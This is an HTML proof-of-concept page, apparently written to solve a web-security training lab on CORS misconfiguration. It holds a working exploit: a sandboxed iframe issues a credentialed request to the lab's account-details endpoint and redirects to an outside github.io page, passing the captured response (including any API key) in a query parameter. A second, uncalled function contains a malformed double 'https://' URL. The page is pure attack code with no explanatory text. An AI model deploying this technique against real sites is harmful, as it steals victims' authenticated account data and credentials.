<!doctype html>
<html>
  <title>CORS POC</title>
<script>function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://https://0ab8003c0459a6068f2cda9e0078009b.web-security-academy.net/accountDetails", true);
             xhr.withCredentials = true;
             xhr.send();
             }</script>
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ab8003c0459a6068f2cda9e0078009b.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://verdecard2023.github.io/mendeleeano.github.io/?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
</html>
